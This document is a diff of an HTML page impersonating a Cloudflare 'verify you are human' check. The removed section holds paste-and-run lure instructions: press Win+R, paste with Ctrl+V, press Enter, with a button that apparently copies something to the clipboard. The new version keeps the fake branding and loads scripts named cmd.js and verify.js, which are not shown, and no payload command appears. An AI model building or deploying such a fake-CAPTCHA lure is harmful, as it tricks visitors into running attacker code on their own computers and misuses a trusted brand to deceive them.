@@ -1,54 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Just a moment...</title>
-    <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verifying...</title>
     <link rel="stylesheet" href="style.css">
+    <meta name="theme-color" content="#ffffff">
 </head>
 <body>
-    <div class="container">
-        <h1 class="title">Just a moment...</h1>
-        <p class="subtitle">Verifying you are human. This may take a few seconds.</p>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1">example.com</h1>
+            <div class="loading-container">
+                <div class="loading-spinner">
+                    <div class="lds-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                <p class="core-msg">Verifying you are human. This may take a few seconds.</p>
+            </div>
 
-        <!-- Cloudflare CAPTCHA Box -->
-        <div class="captcha-container">
-            <label class="captcha-label">
-                <input type="checkbox" id="captchaCheckbox">
-                <span class="captcha-box"></span>
-                <span class="captcha-text">Verify you are human</span>
-            </label>
-            <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" class="cloudflare-logo">
+            <div class="challenge-container">
+                <div class="challenge-header">
+                    <div class="challenge-details">
+                        <div class="challenge-icon">
+                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFyGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNy4yLWMwMDAgNzkuMWI2NWE3OWI0LCAyMDIyLzA2LzEzLTIyOjAxOjAxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjQuMCAoTWFjaW50b3NoKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjMtMTItMjBUMjM6NTg6MzArMDU6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTItMjBUMjM6NTg6MzArMDU6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDIzLTEyLTIwVDIzOjU4OjMwKzA1OjAwIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjFhMmRmNmQ0LTRhMWQtNDQ5OC04YmM5LTM3NDdjOTdkNDU0ZSIgeG1wTU06RG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjFhMmRmNmQ0LTRhMWQtNDQ5OC04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" alt="Cloudflare Logo" width="48" height="48">
+                            <span>Cloudflare</span>
+                        </div>
+                        <div class="challenge-text">Verify you are human</div>
+                    </div>
+                </div>
+
+                <div class="challenge-body">
+                    <div class="checkbox-container">
+                        <div class="checkbox-wrapper">
+                            <label class="checkbox-label">
+                                <input type="checkbox" id="human-checkbox">
+                                <span class="checkmark"></span>
+                                <span class="checkbox-text">I am human</span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="core-msg">
+                example.com needs to review the security of your connection before proceeding.
+            </div>
         </div>
-
-        <!-- Spinner (Hidden Initially) -->
-        <div class="spinner-container" id="loadingSpinner">
-            <div class="spinner"></div>
-            <p class="verifying-text">Verifying...</p>
-        </div>
-
-        <!-- Verification Box (Hidden Initially) -->
-        <div class="verification-box" id="verificationBox">
-            <strong>Security by Cloudflare</strong>
-            <p>Verification steps:</p>
-            <ol>
-                <li>Press & hold <strong>Win + R</strong></li>
-                <li>Press <strong>Ctrl + V</strong> in the verification window</li>
-                <li>Press <strong>Enter</strong></li>
-            </ol>
-            <p><strong>Verification ID:</strong> <span id="rayID"></span></p>
-            <button class="verify-btn" onclick="copyRayID()">VERIFY</button>
-        </div>
-
-        <!-- Cloudflare Footer -->
-        <p class="ray-id">Ray ID: <span id="footerRayID"></span></p>
-        <p class="footer">
-            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a> • 
-            <a href="https://www.cloudflare.com/en-us/website-terms/" target="_blank">Terms</a>
-        </p>
     </div>
 
-    <script src="script.js"></script>
+    <script src="cmd.js"></script>
+    <script src="verify.js"></script>
 </body>
 </html>
